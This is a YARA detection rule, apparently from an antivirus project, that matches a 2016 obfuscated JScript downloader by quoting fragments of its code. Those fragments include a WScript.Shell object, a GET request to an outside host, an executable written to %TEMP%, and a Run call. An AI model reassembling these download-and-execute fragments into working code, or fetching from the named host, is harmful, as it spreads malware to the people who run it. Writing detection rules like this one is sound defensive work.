rule sig_20160330_b7aed8cd0be676af26feea5467e0a60a {
  meta:
    description = "datamaliciousorder - file 20160330_b7aed8cd0be676af26feea5467e0a60a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c3c92e8e9fb16c52617ad7e9b6b48f8f9c4d2df3adf4af9f33db6d653b6b7e02"

  strings:
    $s1  = "var _QN = function _K() {return WScript[_O](\"WScript\"+\".Shell\");}(), _L0 = 11;" fullword ascii
    $s2  = "function _WJ(_F0, _YZ){_A = _A * 1; return _F0 - _YZ;};" fullword ascii
    $s3  = "_TF0[_E](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s4  = "if (_TF0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _C(){return _HZ + \"\";};" fullword ascii
    $s6  = "function _KH() {return _QN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7aRfmTmrOmRh36Q.ex\" + \"e\";};" fullword ascii
    $s7  = "function _BP() {return ((_Y0 == true) && (_Y0 == _MG)) ? 1 : _A;};" fullword ascii
    $s8  = "function _Q(_ZN){_QN[\"Run\"](_ZN, _A, _A);};" fullword ascii
    $s9  = "function _R(){return 22;};" fullword ascii
    $s10 = "function _Y(){return _O;};" fullword ascii
    $s11 = "function _TW(_C0) {var _SI = (1, 2, 3, 4, 5, _C0); return _SI;};" fullword ascii
    $s12 = " while (_R0){" fullword ascii
    $s13 = "function _KQ()" fullword ascii
    $s14 = "return _WJ(_JM, _U);" fullword ascii
    $s15 = "var _TF = new this[\"Date\"]();" fullword ascii
    $s16 = "var _Y0 = false;" fullword ascii
    $s17 = "_Y0 = true; " fullword ascii
    $s18 = "var _YU = false;" fullword ascii
    $s19 = "_MG = true; " fullword ascii
    $s20 = "var _MG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}